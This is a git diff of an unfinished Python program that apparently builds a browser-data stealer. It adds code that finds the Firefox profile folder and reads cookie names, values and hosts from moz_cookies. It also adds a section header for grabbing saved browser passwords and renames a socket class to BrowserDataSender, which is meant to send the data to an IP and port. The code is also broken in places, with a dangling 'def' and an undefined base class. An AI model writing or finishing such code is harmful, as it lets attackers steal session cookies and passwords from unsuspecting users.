@@ -1,8 +1,8 @@
 from abc import ABC, abstractmethod
-import os, socket, platform;
+import os, socket, platform, sqlite3;
 
 
-# * Operating System Detector
+# * Classes to detect Operating System
 class OSInterface(ABC):
     @abstractmethod
     def DetectOperatingSystem(self):
@@ -12,6 +12,25 @@ class OSInterface(ABC):
 class OSDetector(OSInterface):
     def DetectOperatingSystem(self):
         return platform.system();
+
+
+# * Classes to search profile directories in different browsers
+
+class ProfileDirectoryFinder(ABC):
+    @abstractmethod
+    def FindProfileDirectory(self):
+        pass
+
+class FirefoxProfileFinder(ProfileDirectoryFinder):
+
+    def 
+
+
+
+
+
+
+
 
 
 
@@ -30,19 +49,102 @@ class BrowserCookiesGetter(ABC):
     def GetCookiesInWindows(self, username):
         pass
 
+    
+
+
 class FirefoxCookiesGetter(BrowserCookiesGetter):
 
     def __init__(self): 
         pass
 
-    def GetCookiesInLinux(self, username):
-        pass
 
+    def GetCookiesInLinux(self):
+
+        homeDirectory = os.path.expanduser("~");
+        browserDirectory = os.path.join(homeDirectory, ".mozilla/firefox")
+
+
+        if ".mozilla" not in os.listdir(homeDirectory):
+            print("firefox not installed")
+            return False;
+
+
+        for directory in os.listdir(browserDirectory):
+
+            if(directory.endswith(".default-esr")):
+                browserDirectory = os.path.join(browserDirectory, directory);
+                break;
+
+            elif(directory.endswith(".default")):
+                browserDirectory = os.path.join(browserDirectory, directory); 
+
+
+        try: 
+
+            connection = sqlite3.connect(browserDirectory)
+            cursor = connection.cursor()
+            cursor.execute('SELECT name, value, host FROM moz_cookies')
+            cookies = cursor.fetchall()
+            connection.close()
+
+            return cookies;
+
+        except Exception as e:
+            print(e)
+            return False;
+            
     def GetCookiesInWindows(self, username):
         pass
 
 
-class ChromeCookiesGetter(BrowserCookiesGetter):
+
+
+
+
+
+# * Classes to get saved passwords in browsers 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+class ChromeCookiesGetter(BrowserCredentialsGetter):
     def __init__(self): 
         pass
 
@@ -52,7 +154,7 @@ class ChromeCookiesGetter(BrowserCookiesGetter):
 
 
 
-class EdgeCookiesGetter(BrowserCookiesGetter):
+class EdgeCookiesGetter(BrowserCredentialsGetter):
 
     def __init__(self): 
         pass
@@ -68,8 +170,11 @@ class SocketSender(ABC):
     def Send(ip, port):
         pass
 
+     
+
+
     
-class SendCookies(SocketSender):
+class BrowserDataSender(SocketSender):
 
     def __init__(self):
         pass
@@ -86,13 +191,16 @@ class SendCookies(SocketSender):
 
 def Main():
 
-    detector = OSDetector();
+    homeDirectory = os.path.expanduser("~");
+    cookiesDirectory = homeDirectory;
 
-    os = detector.DetectOperatingSystem()
+    if ".mozilla" not in os.listdir(homeDirectory):
+        print("No esta")
 
-    print(os)
-
-
+    cookiesDirectory = cookiesDirectory + "/.mozilla/firefox"
+    xd = os.listdir(cookiesDirectory)
+    print(xd)
+    
 
 
 
